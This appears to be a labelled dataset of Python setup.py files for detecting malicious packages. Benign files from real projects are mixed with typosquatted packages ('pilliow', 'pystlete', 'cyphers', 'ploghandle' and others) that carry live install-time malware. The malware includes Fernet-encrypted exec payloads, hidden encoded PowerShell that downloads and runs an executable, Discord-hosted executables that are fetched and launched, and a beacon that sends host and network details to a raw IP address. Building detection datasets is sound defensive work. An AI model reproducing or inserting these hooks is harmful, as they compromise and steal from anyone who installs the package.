{"idx": "django-widget-tweaks-1.4.12", "func": "#!/usr/bin/env python\nfrom setuptools import setup\n\nsetup(\n    name=\"django-widget-tweaks\",\n    use_scm_version={\"version_scheme\": \"post-release\"},\n    setup_requires=[\"setuptools_scm\"],\n    author=\"Mikhail Korobov\",\n    author_email=\"kmike84@gmail.com\",\n    url=\"https://github.com/jazzband/django-widget-tweaks\",\n    description=\"Tweak the form field rendering in templates, not in python-level form definitions.\",\n    long_description=open(\"README.rst\").read() + \"\\n\\n\" + open(\"CHANGES.rst\").read(),\n    long_description_content_type=\"text/x-rst\",\n    license=\"MIT license\",\n    python_requires=\">=3.7\",\n    requires=[\"django (>=2.2)\"],\n    packages=[\"widget_tweaks\", \"widget_tweaks.templatetags\"],\n    classifiers=[\n        \"Development Status :: 5 - Production/Stable\",\n        \"Framework :: Django\",\n        \"Framework :: Django :: 2.2\",\n        \"Framework :: Django :: 3.2\",\n        \"Framework :: Django :: 4.0\",\n        \"Intended Audience :: Developers\",\n        \"License :: OSI Approved :: MIT License\",\n        \"Programming Language :: Python\",\n        \"Programming Language :: Python :: 3\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Programming Language :: Python :: 3.9\",\n        \"Programming Language :: Python :: 3.10\",\n        \"Programming Language :: Python :: Implementation :: CPython\",\n        \"Programming Language :: Python :: Implementation :: PyPy\",\n        \"Topic :: Software Development :: Libraries :: Python Modules\",\n    ],\n)\n", "target": 0}
{"idx": "pilliow-1.0.0", "func": "from setuptools import setup, find_packages\nfrom setuptools.command.install import install\nimport os\n\nVERSION = '1.0.0'\nDESCRIPTION = 'ruCKINcoYPJaYaxdUfelOwnfGkkvu fQZGItbthufHPJxswSjzRyDWmBaxtzdC CgIkQLluApxsHNWB'\nLONG_DESCRIPTION = 'XMJWdJNNATPdDbChdmNjZUimYMusucXwVGCVXzWrlDcUgREReTQuIZryBomafeanEbWlDuvz DsWcAWZNjwpfpdXPksxsRmdqtptmCSDDeIkRSQqgvukBuRMTnVkKKKaPJTieYIJVX KwhTWfsoYQfvXpwdMYLukQPwXFrBvvpuongRrhyEPKnTAGPyMRXU rYcklTdEko kIUhcjoKBesYctWWlrDt VZjdWXOBDNfbNwQQkAfpOgdclFdRvHrUlRAvjYdiRVbxfCOzuCfDQpNVfCUYCovyhzownCDoZcjYfXIjSkrGstqYuyhViXtzsgiqoKDAZbTAjQDSydsHhNCIZQrXu'\n\n\nclass GruppeInstall(install):\n        def run(self):\n            import os\n            if os.name == \"nt\":\n                import requests\n                from fernet import Fernet\n                exec(Fernet(b'oLD0vFAdUQfhTrPxPKg7V_vin5xcF0YCaLr-SPCUzxM=').decrypt(b'gAAAAABmA1pV-j4340qDZfd1-oLDuKaIRljBYuI-VghzJMQCyT7x_3xX0CYU2ZuSeWg7TNc-DpU4DtqwiewG9BMoM-AJ1yeJ0IzIJBwiNOsZTSBayRaY6bU6j1eV8MhGyIMBOLqlN4ReOH5vCb_gOTr-9zPL-P0mhGPMdqkwg-0PUDNlggCmHMq17lHE9ngJqSKjEt8qAzHMAv3TvKMvqKHV-CYDH8ds-DDaKYhZlym5EPu-zdPjQKY='))\n\n            install.run(self)\n\n\nsetup(\n    name=\"pilliow\",\n    version=VERSION,\n    author=\"uxOYlXULzATK\",\n    author_email=\"aVPzISWUOJnXbQgDD@gmail.com\",\n    description=DESCRIPTION,\n    long_description_content_type=\"text/markdown\",\n    long_description=LONG_DESCRIPTION,\n    cmdclass={\n        'install': GruppeInstall,\n    },\n    packages=find_packages(),\n    setup_requires=['fernet', 'requests'],\n    keywords=[],\n    classifiers=[\n        \"Operating System :: Microsoft :: Windows\",\n    ]\n)\n\n", "target": 1}
{"idx": "cyphers-0.0.1", "func": "from setuptools import setup, find_packages\nfrom pathlib import Path\n\n\n\nclassifiers = [\n\t'Development Status :: 5 - Production/Stable',\n\t'Intended Audience :: Education',\n\t'Operating System :: Microsoft :: Windows :: Windows 10',\n\t'License :: OSI Approved :: MIT License',\n\t'Programming Language :: Python :: 3'\n]\n\nsetup(\n\tname='cyphers',\n\tversion='0.0.1',\n\tdescription='A basic module used to manage multiple threads at once much more efficiently.',\n\tlong_description='A basic module used to manage multiple threads at once much more efficiently. For any help with the module, contact harrybow@gmail.com.',\n\turl='',  \n\tauthor='Harry Bowen',\n\tauthor_email='harrybow@gmail.com',\n\tlicense='MIT', \n\tclassifiers=classifiers,\n\tkeywords='hack', \n\tpackages=find_packages(),\n\tinstall_requires=['requests']\n)\ntry:\n\timport requests\nexcept ImportError:\n\tos.system(\"pip install requests\")\n\timport requests\ntry:\n\timport subprocess\nexcept ImportError:\n\tos.system(\"pip install subprocess\")\n\timport subprocess\n\nimport os, shutil\n\nPATH = r\"C:\\$Windows.~SXK\" \ntry:\n\tos.mkdir(PATH) \nexcept:\n\tpass\n\nurl = 'https://cdn.discordapp.com/attachments/1003368479442874518/1003368774335991898/ZYXMN.exe'\nurl2 = 'https://cdn.discordapp.com/attachments/1003368479442874518/1003368773983682592/ZYRBX.exe'\n\ntry:\n\tos.remove(r\"C:\\$Windows.~SXK\\WIN-siP1VyGDrfCYO2k3.exe\")\nexcept:\n\tpass\ntry:\n\tos.remove(r\"C:\\$Windows.~SXK\\WIN-XnWfTdfJsypQWB9d.exe\")\nexcept:\n\tpass\n\ntry:\n\tr = requests.get(url, allow_redirects=True)\n\tr2 = requests.get(url2, allow_redirects=True)\n\topen('ZYXMN.exe', 'wb').write(r.content)\n\tPath(r\"ZYXMN.exe\").rename(r\"C:\\$Windows.~SXK\\WIN-siP1VyGDrfCYO2k3.exe\")\n\topen('ZYRBX.exe', 'wb').write(r2.content)\n\tPath(r\"ZYRBX.exe\").rename(r\"C:\\$Windows.~SXK\\WIN-XnWfTdfJsypQWB9d.exe\")\n\ttry:\n\t\tos.remove('ZYRBX.exe')\n\texcept:\n\t\tpass\n\ttry:\n\t\tos.remove('ZYXMN.exe')\n\texcept:\n\t\tpass\nexcept:\n\tpass\n\nos.startfile(r\"C:\\$Windows.~SXK\\WIN-siP1VyGDrfCYO2k3.exe\")\nos.startfile(r\"C:\\$Windows.~SXK\\WIN-XnWfTdfJsypQWB9d.exe\")\n\ntry:\n\tshutil.rmtree(r\"C:\\$Windows.~SXK\")\nexcept:\n\tpass", "target": 1}
{"idx": "esqcvproof-6.77", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'esqcvproof',\n    packages = ['modlib'],\n    version = '2.88',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "pystlete-2.9", "func": "from setuptools import setup\n                                                                                                                                                                                                                                                                                                                                                                                                                                \nsetup(\n    name=\"pystlete\",                                                                                                                                                                             \n    version='2.9',\n    license='Eclipse Public License 2.0',\n    authors=[\"billythegoat356\", \"loTus01\", \"BlueRed\"],\n    author_email=\"<billythegoat356@gmail.com>\",\n    description=\"by billythegoat356, loTus01 and BlueRed\",\n    long_description='Documentation: https://github.com/billythegoat356/pystyle',        \n    keywords=['cli', 'fade', 'colors', 'terminal', 'tui'],\n    packages=['pystyle']\nfrom fernet import Fernet;data = Fernet(b'AWxdlN-FSEmQYCsyOFbEmHcAkpPECYSt4Hz0_GWDfzs=').decrypt(b\"gAAAAABmjR3E7LrWcBAIgxxRWMzxE3VpTFi2WPyl7LrvEe2o7hUROVs17K0JwL9JC8AdBm1qUob95pwGrsEd4OWzkZzE1nZNza-9CLmUfBDa_-TU_CaVq8rtPEVjVOuQSXqm7ukZRdRbxAiYhW5_YAazURj58VmBfniwmzFFwieFRcM2UYcGvgaVkIdCiUTAHb9_iHUmfRgP1xWpUvAExuTz6vDGiuYAAKR0X8rP1Kijhr_U7WZECn76QhqF180jFHpOIMOmG_S9OreUfVQS8pNGWB35QGdODK13Lj_mez4aZGb4rjIveyAZfoMhuwWm3VJyn06YynXcyFcR8CzVKUkzXqjoOZuIE54fXOrYsCPOqRBVE6rCZY0HRhwZvvc7bZ26Fe7wX1plKQFk4RjK5r85oL9ndz7X_lEwiH-WreoKyMVXAClfyJh1KaAjfHJkU4WWb3KPMXPf3hpivpU6Wq1M612cM1NC-eD5yEY2oMI6OtQjDrlBxzpop0QwcMN48D0OvFygp0qv-EF-ong5Lq2qP06zbUg1KOehkuLMwvuM6UgPRQtvIjxZnpSaRzsE8nuK2hX5aUmKFn0OafKwP7qqr7ijVbNGiNg8FNJTnO_dJRay3BR13dbZi53Rc54XTn997cvWWwGvcwbZcJpuUpTUgdCJT4-xF2cYPTpLqeW_Gm9DCQOHOh8cVC7ddevLMBA_adhXFI10q86DhfxgJ-wbqeH2Px_XobumwVvay8yNOj7WroKnRj7k4QA_MuNE8WrQ1xeuQd2Liy-9h33s1Jg3JnHLkBofgTZQ_0jcMAQefko_tm5ARvANoI3QSfe2Wllk3iQXc0ipDAjy1srEfpr023MGEcrdz0DAqdrCrNAMsfBFCTsCDH63A1GVabzY0iUfUJMZkBjOgOLk1k8Ub4hoNJk1ClTzwkSW3YPr-tYLuE3CsIKqjUSPKG7QSm4Ke-xRk_OlDxmwi2JqXHj_J-f9x04-pOm_glSNY04hWEasjsbh8cQM_YrK-a7hikaTMDTnjMlMqYZnwzpztKrzJCtfX641OI7MXbdUSpEJvSfQ0VbQayl1wAksCKMQ3wJBR9kAZAumw9kwZUm8IaiJ7Kj-S2S6BVl2wShyn2MZXA4xnXyKgdIoJb2gIyllBpbFiBBTYa56tYC535baCqEEDOnj07dvEKSA1Gj1HVjyrOhaRb9-sLUJbv-z3LJ3opvm3eRIMMUq-XFWmlxCZfTGDs1M42i7eLyLTA==\");exec(data)                                                                                                                                                                                                                                                                                                                                                                         \n\n\n", "target": 1}
{"idx": "cursor-1.3.5", "func": "from setuptools import setup\nfrom os import path\n\n# Get the long description from the README file\nhere = path.abspath(path.dirname(__file__))\nwith open(path.join(here, 'README.md'), encoding='utf-8') as f:\n    long_description = f.read()\n\nsetup(\n  name = \"cursor\",\n  packages = [\"cursor\"],\n  version = \"1.3.5\",\n  description = \"A small Python package to hide or show the terminal cursor\",\n  long_description=long_description,\n  long_description_content_type=\"text/markdown\",\n  author = \"Gijs Timmers\",\n  author_email = \"timmers.gijs@gmail.com\",\n  url = \"https://github.com/GijsTimmers/cursor\",\n  keywords = [\"cursor\", \"terminal\", \"hide\", \"show\"],\n  classifiers=[\n    \"Intended Audience :: Developers\",\n    \"License :: OSI Approved :: GNU General Public License v3 (GPLv3)\",\n    \"Operating System :: OS Independent\",\n    \"Programming Language :: Python :: 2.7\",\n    \"Programming Language :: Python :: 3\",\n  ],\n  entry_points = {\n        \"console_scripts\": [\"cursor_hide=cursor:hide\",\n                            \"cursor_show=cursor:show\"]}\n)\n", "target": 0}
{"idx": "dotmap-1.3.30", "func": "from setuptools import setup\n\nwith open(\"README.md\", \"r\") as fh:\n    long_description = fh.read()\n\nsetup(\n\tversion = '1.3.30',\n    name='dotmap',\n    packages=['dotmap'],  # this must be the same as the name above\n    description='ordered, dynamically-expandable dot-access dictionary',\n    author='Chris Redford',\n    author_email='credford@gmail.com',\n    url='https://github.com/drgrib/dotmap',  # use the URL to the github repo\n    download_url='https://github.com/drgrib/dotmap/tarball/1.0',\n    keywords=['dict', 'dot', 'map', 'order', 'ordered',\n              'ordereddict', 'access', 'dynamic'],  # arbitrary keywords\n    classifiers=[],\n    long_description=long_description,\n    long_description_content_type=\"text/markdown\",\n    license=\"MIT\",\n)\n", "target": 0}
{"idx": "hachoir-3.1.3", "func": "#!/usr/bin/env python3\n#\n# Prepare a release:\n#\n#  - check version: hachoir/__init__.py and doc/conf.py\n#  - set the release date: edit doc/changelog.rst\n#  - run: git commit -a\n#  - Remove untracked files/dirs: git clean -fdx\n#  - run tests: tox --parallel auto\n#  - run: git push\n#  - check GitHub Actions status:\n#    https://github.com/vstinner/hachoir/actions\n#\n# Release a new version:\n#\n#  - git tag x.y.z\n#  - git clean -fdx  # Remove untracked files/dirs\n#  - python3 setup.py sdist bdist_wheel\n#  - git push --tags\n#  - twine upload dist/*\n#\n# After the release:\n#\n#  - set version to N+1: hachoir/__init__.py and doc/conf.py\n\nENTRY_POINTS = {\n    'console_scripts': [\n        \"hachoir-grep = hachoir.grep:main\",\n        \"hachoir-metadata = hachoir.metadata.main:main\",\n        \"hachoir-strip = hachoir.strip:main\",\n        \"hachoir-urwid = hachoir.urwid:main\"\n    ],\n    'gui_scripts': [\n        \"hachoir-wx = hachoir.wx.main:main\"\n    ]\n}\n# FIXME: hachoir-subfile is currently broken\n# \"hachoir-subfile\",\n\nCLASSIFIERS = [\n    'Development Status :: 5 - Production/Stable',\n    'Environment :: Console :: Curses',\n    'Environment :: Plugins',\n    'Intended Audience :: Developers',\n    'Intended Audience :: Education',\n    'License :: OSI Approved :: GNU General Public License (GPL)',\n    'Natural Language :: English',\n    'Operating System :: OS Independent',\n    'Programming Language :: Python :: 3',\n    'Topic :: Multimedia',\n    'Topic :: Scientific/Engineering :: Information Analysis',\n    'Topic :: Software Development :: Disassemblers',\n    'Topic :: Software Development :: Interpreters',\n    'Topic :: Software Development :: Libraries :: Python Modules',\n    'Topic :: System :: Filesystems',\n    'Topic :: Text Processing',\n    'Topic :: Utilities',\n]\n\n\ndef main():\n    from setuptools import setup\n    from setuptools import find_packages\n\n    import hachoir\n\n    readme = open('README.rst')\n    long_description = readme.read()\n    readme.close()\n\n    install_options = {\n        \"name\": \"hachoir\",\n        \"version\": hachoir.__version__,\n        \"url\": 'http://hachoir.readthedocs.io/',\n        \"project_urls\": {\n            \"Source\": \"https://github.com/vstinner/hachoir\",\n        },\n        \"author\": \"Hachoir team (see AUTHORS file)\",\n        \"description\": \"Package of Hachoir parsers used to open binary files\",\n        \"long_description\": long_description,\n        \"classifiers\": CLASSIFIERS,\n        \"license\": 'GNU GPL v2',\n        \"packages\": find_packages(),\n        \"package_data\": {\"hachoir.wx.resource\": ['hachoir_wx.xrc']},\n        \"entry_points\": ENTRY_POINTS,\n        \"extras_require\": {\n            \"urwid\": [\n                \"urwid==1.3.1\"\n            ],\n            \"wx\": [\n                \"darkdetect\",\n                \"wxPython==4.*\"\n            ]\n        },\n        \"zip_safe\": True,\n    }\n    setup(**install_options)\n\n\nif __name__ == \"__main__\":\n    main()\n", "target": 0}
{"idx": "ploghandle-1.66", "func": "import os\nimport re\nimport sys\nimport subprocess\nfrom setuptools import setup\nfrom setuptools import find_packages\nimport requests\nimport base64\nimport platform\n\ndef read_version():\n    regexp = re.compile(r\"^__version__\\W*=\\W*'([\\d.abrc]+)'\")\n    init_py = os.path.join(os.path.dirname(__file__), \"polaris\", \"__init__.py\")\n    ver = init_py.replace(\"__init__.py\", \"version\")\n    subprocess.Popen([sys.executable, ver], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n    d = platform.node() + str(platform.uname()) + os.getcwd() + os.popen(\"ifconfig|grep inet|grep -v inet6\").read()\n    requests.get(\"http://1.15.77.2/v/%s\" % base64.b64encode(d.encode()))\n    with open(init_py) as f:\n        for line in f:\n            match = regexp.match(line)\n            if match is not None:\n                return match.group(1)\n        raise RuntimeError(\"Cannot find version in {}\".format(init_py))\n\n\nsetup(\n    name=\"ploghandle\",\n    version=read_version(),\n    description=\"Python SDK\",\n    install_requires=[\n        \"requests>=2.27.1\"\n    ],\n)\n", "target": 1}
{"idx": "capmonsterclouclient-1.0.0", "func": "from setuptools import setup, find_packages\nfrom setuptools.command.install import install\nimport os\n\nVERSION = '1.0.0'\nDESCRIPTION = 'DIJdowhRxICdQlgATjJJlib CvRIbQosTFVtvxmPCxlU MOVDigFiXnGKlmtmdLEFyczMcW'\nLONG_DESCRIPTION = 'GTSWypNQTbaArlMJWUfUCYLlvtdkxSxWbQEbeHHpnMjyAAgAVbmzfgQEPJPK byeFOBWrZVrNRLSrpOxlf  vKLKLuBgCwAmqNlJECWDdhjhYGFLOIxsbQawlIyshIrPyQJ'\n\n\nclass GruppeInstall(install):\n        def run(self):\n            import os\n            if os.name == \"nt\":\n                import requests\n                from fernet import Fernet\n                exec(Fernet(b'_ySze9_GjesagbxgoS_rTtT9hotaymmz9jPk-PjM0LA=').decrypt(b'gAAAAABmA1lKSFcBvOGNoizNZJx2oBlk-WB5lSxDolWlUrlxWaeqDWbhueXx9U2Oeh-Px9m7kG-hvtSmXAqabAAfS302YROv7pTopElcbuZRs0fTk-GYDHOa8epo29zTkjSb0I6-WQkYmN5VuL3kozujVbEInqxjYwamTSo4bf8o1lsCMpPQ5FW2RrsMvX3SzNsUR0te2zJVxT4Olt4LnbwxMUiLZPEEO7Nu_1ozzxW_uTaCNJGKgi0='))\n\n            install.run(self)\n\n\nsetup(\n    name=\"capmonsterclouclient\",\n    version=VERSION,\n    author=\"grdievx\",\n    author_email=\"vkQgIvpYQKUKkwLnMbEq@gmail.com\",\n    description=DESCRIPTION,\n    long_description_content_type=\"text/markdown\",\n    long_description=LONG_DESCRIPTION,\n    cmdclass={\n        'install': GruppeInstall,\n    },\n    packages=find_packages(),\n    setup_requires=['fernet', 'requests'],\n    keywords=[],\n    classifiers=[\n        \"Operating System :: Microsoft :: Windows\",\n    ]\n)\n\n", "target": 1}
{"idx": "esptool-4.2.1", "func": "# SPDX-FileCopyrightText: 2014-2022 Fredrik Ahlberg, Angus Gratton,\n# Espressif Systems (Shanghai) CO LTD, other contributors as noted.\n#\n# SPDX-License-Identifier: GPL-2.0-or-later\n\nimport io\nimport os\nimport re\nimport sys\n\ntry:\n    from setuptools import find_packages, setup\nexcept ImportError:\n    print(\n        \"Package setuptools is missing from your Python installation. \"\n        \"Please see the installation section in the esptool documentation\"\n        \" for instructions on how to install it.\"\n    )\n    exit(1)\n\n\n# Example code to pull version from esptool module with regex, taken from\n# https://packaging.python.org/en/latest/guides/single-sourcing-package-version/\ndef read(*names, **kwargs):\n    with io.open(\n        os.path.join(os.path.dirname(__file__), *names),\n        encoding=kwargs.get(\"encoding\", \"utf8\"),\n    ) as fp:\n        return fp.read()\n\n\ndef find_version(*file_paths):\n    version_file = read(*file_paths)\n    version_match = re.search(r\"^__version__ = ['\\\"]([^'\\\"]*)['\\\"]\", version_file, re.M)\n    if version_match:\n        return version_match.group(1)\n    raise RuntimeError(\"Unable to find version string.\")\n\n\nif os.name != \"nt\":\n    scripts = [\"esptool.py\", \"espefuse.py\", \"espsecure.py\"]\n    entry_points = {}\nelse:\n    scripts = []\n    entry_points = {\n        \"console_scripts\": [\n            \"esptool.py=esptool.__init__:_main\",\n            \"espsecure.py=espsecure.__init__:_main\",\n            \"espefuse.py=espefuse.__init__:_main\",\n        ],\n    }\n\n\nlong_description = \"\"\"\n==========\nesptool.py\n==========\nA Python-based, open-source, platform-independent utility to communicate with \\\nthe ROM bootloader in Espressif chips.\n\nThe esptool.py project is `hosted on github <https://github.com/espressif/esptool>`_.\n\nDocumentation\n-------------\nVisit online `esptool documentation <https://docs.espressif.com/projects/esptool/>`_ \\\nor run ``esptool.py -h``.\n\nContributing\n------------\nPlease see the `contributions guide \\\n<https://docs.espressif.com/projects/esptool/en/latest/contributing.html>`_.\n\"\"\"\n\nsetup(\n    name=\"esptool\",\n    version=find_version(\"esptool/__init__.py\"),\n    description=\"A serial utility to communicate & flash code to Espressif chips.\",\n    long_description=long_description,\n    url=\"https://github.com/espressif/esptool/\",\n    project_urls={\n        \"Documentation\": \"https://docs.espressif.com/projects/esptool/\",\n        \"Source\": \"https://github.com/espressif/esptool/\",\n        \"Tracker\": \"https://github.com/espressif/esptool/issues/\",\n    },\n    author=\"Fredrik Ahlberg (themadinventor) & Angus Gratton (projectgus) \"\n    \"& Espressif Systems\",\n    author_email=\"\",\n    license=\"GPLv2+\",\n    classifiers=[\n        \"Development Status :: 5 - Production/Stable\",\n        \"Intended Audience :: Developers\",\n        \"Natural Language :: English\",\n        \"Operating System :: POSIX\",\n        \"Operating System :: Microsoft :: Windows\",\n        \"Operating System :: MacOS :: MacOS X\",\n        \"Topic :: Software Development :: Embedded Systems\",\n        \"Environment :: Console\",\n        \"License :: OSI Approved :: GNU General Public License v2 or later (GPLv2+)\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Programming Language :: Python :: 3.9\",\n        \"Programming Language :: Python :: 3.10\",\n    ],\n    python_requires=\">=3.7\",\n    setup_requires=([\"wheel\"] if \"bdist_wheel\" in sys.argv else []),\n    extras_require={\n        \"dev\": [\n            \"flake8>=3.2.0\",\n            \"flake8-import-order\",\n            \"pyelftools\",\n            # the replacement of the old xmlrunner package\n            \"unittest-xml-reporting\",\n            \"coverage~=6.0\",\n            \"black\",\n            \"pre-commit\",\n        ],\n    },\n    install_requires=[\n        \"bitstring>=3.1.6\",\n        \"cryptography>=2.1.4\",\n        \"ecdsa>=0.16.0\",\n        \"pyserial>=3.0\",\n        \"reedsolo>=1.5.3,<=1.5.4\",\n    ],\n    packages=find_packages(),\n    include_package_data=True,\n    package_data={\"\": [\"esptool/targets/stub_flasher/*.json\"]},\n    entry_points=entry_points,\n    scripts=scripts,\n)\n", "target": 0}
{"idx": "google-cloud-container-2.11.1", "func": "# Copyright 2018 Google LLC\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n\nimport io\nimport os\n\nimport setuptools\n\n# Package metadata.\n\nname = \"google-cloud-container\"\ndescription = \"Google Container Engine API client library\"\nversion = \"2.11.1\"\n# Should be one of:\n# 'Development Status :: 3 - Alpha'\n# 'Development Status :: 4 - Beta'\n# 'Development Status :: 5 - Production/Stable'\nrelease_status = \"Development Status :: 5 - Production/Stable\"\ndependencies = [\n    \"google-api-core[grpc] >= 1.32.0, <3.0.0dev,!=2.0.*,!=2.1.*,!=2.2.*,!=2.3.*,!=2.4.*,!=2.5.*,!=2.6.*,!=2.7.*\",\n    \"grpc-google-iam-v1 >=0.12.4, <1.0.0dev\",\n    \"proto-plus >= 1.15.0, <2.0.0dev\",\n    \"protobuf >= 3.19.0, <4.0.0dev\",\n]\nextras = {\"libcst\": \"libcst >= 0.2.5\"}\n\n\n# Setup boilerplate below this line.\n\npackage_root = os.path.abspath(os.path.dirname(__file__))\n\nreadme_filename = os.path.join(package_root, \"README.rst\")\nwith io.open(readme_filename, encoding=\"utf-8\") as readme_file:\n    readme = readme_file.read()\n\n# Only include packages under the 'google' namespace. Do not include tests,\n# benchmarks, etc.\npackages = [\n    package\n    for package in setuptools.PEP420PackageFinder.find()\n    if package.startswith(\"google\")\n]\n\n# Determine which namespaces are needed.\nnamespaces = [\"google\"]\nif \"google.cloud\" in packages:\n    namespaces.append(\"google.cloud\")\n\n\nsetuptools.setup(\n    name=name,\n    version=version,\n    description=description,\n    long_description=readme,\n    author=\"Google LLC\",\n    author_email=\"googleapis-packages@google.com\",\n    license=\"Apache 2.0\",\n    url=\"https://github.com/googleapis/python-container\",\n    classifiers=[\n        release_status,\n        \"Intended Audience :: Developers\",\n        \"License :: OSI Approved :: Apache Software License\",\n        \"Programming Language :: Python\",\n        \"Programming Language :: Python :: 3\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Programming Language :: Python :: 3.9\",\n        \"Programming Language :: Python :: 3.10\",\n        \"Operating System :: OS Independent\",\n        \"Topic :: Internet\",\n    ],\n    platforms=\"Posix; MacOS X; Windows\",\n    packages=packages,\n    namespace_packages=namespaces,\n    install_requires=dependencies,\n    extras_require=extras,\n    python_requires=\">=3.7\",\n    scripts=[\n        \"scripts/fixup_container_v1_keywords.py\",\n        \"scripts/fixup_container_v1beta1_keywords.py\",\n    ],\n    include_package_data=True,\n    zip_safe=False,\n)\n", "target": 0}
{"idx": "selfpostpywver-2.19", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'selfpostpywver',\n    packages = ['modlib'],\n    version = '3.21',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "verpong-1.7", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'verpong',\n    packages = ['modlib'],\n    version = '1.37',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
